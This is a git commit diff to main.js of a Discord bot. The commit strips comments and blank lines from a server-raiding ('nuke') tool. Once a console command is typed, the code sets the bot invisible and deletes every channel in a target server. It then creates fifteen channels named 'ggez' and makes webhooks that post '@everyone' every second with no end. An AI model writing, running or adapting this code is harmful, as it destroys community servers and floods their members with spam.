5f2fcec0c2e16b0341770866f4ca37b9900372bd
menotte <139005962+menotte@users.noreply.github.com>
2023-10-07 22:54:53 +0200

    Update main.js

--- main.js
+++ main.js
@@ -1,58 +1,40 @@
 const Discord = require('discord.js');
 const client = new Discord.Client();
 
-// Token
 const botToken = 'token';
-
-// ID
 const serverId = 'id';
-
-// Console command
 const commande = 'spam';
-
-// Channel
 const nombreCanaux = 15;
-
-// Prefix
 const prefixeNomCanaux = 'ggez';
-
-// Message
 const nombreMessages = Infinity;
 
-// Del all channel
 async function supprimerCanaux() {
   const server = client.guilds.cache.get(serverId);
-
   server.channels.cache.forEach(async (channel) => {
     await channel.delete().catch(console.error);
   });
 }
 
-// Make channel
 async function creerCanaux() {
   const server = client.guilds.cache.get(serverId);
-
   for (let i = 1; i <= nombreCanaux; i++) {
     const nomCanal = `${prefixeNomCanaux}${i}`;
-
     await server.channels.create(nomCanal, { type: 'text' }).catch(console.error);
   }
 }
 
-// Create webhook
 async function creerWebhooksEtEnvoyerMessages() {
   const server = client.guilds.cache.get(serverId);
-
   server.channels.cache.forEach(async (channel) => {
     if (channel.type === 'text') {
       const webhook = await channel.createWebhook('Webhook', {
-        avatar: 'https://i.imgur.com/AfFp7pu.png', // Webhook URL
+        avatar: 'https://i.imgur.com/AfFp7pu.png',
       }).catch(console.error);
 
       if (webhook) {
         let messageCount = 0;
         setInterval(() => {
-          webhook.send('@everyone') // the message
+          webhook.send('@everyone')
             .then(() => {
               messageCount++;
               if (messageCount >= nombreMessages) {
@@ -60,7 +42,7 @@ async function creerWebhooksEtEnvoyerMessages() {
               }
             })
             .catch(console.error);
-        }, 1000); // send message every second
+        }, 1000);
       }
     }
   });
@@ -68,17 +50,12 @@ async function creerWebhooksEtEnvoyerMessages() {
 
 client.on('ready', () => {
   console.log(`Connecté en tant que ${client.user.tag}`);
-
-  // bot offline
   client.user.setPresence({ status: 'invisible' })
     .then(() => console.log('Bot offline'))
     .catch(console.error);
 
-  // listen command console
   process.stdin.on('data', (data) => {
     const input = data.toString().trim();
-
-    // verif command
     if (input === commande) {
       supprimerCanaux()
         .then(() => creerCanaux())
@@ -88,5 +65,4 @@ client.on('ready', () => {
   });
 });
 
-// login
 client.login(botToken);
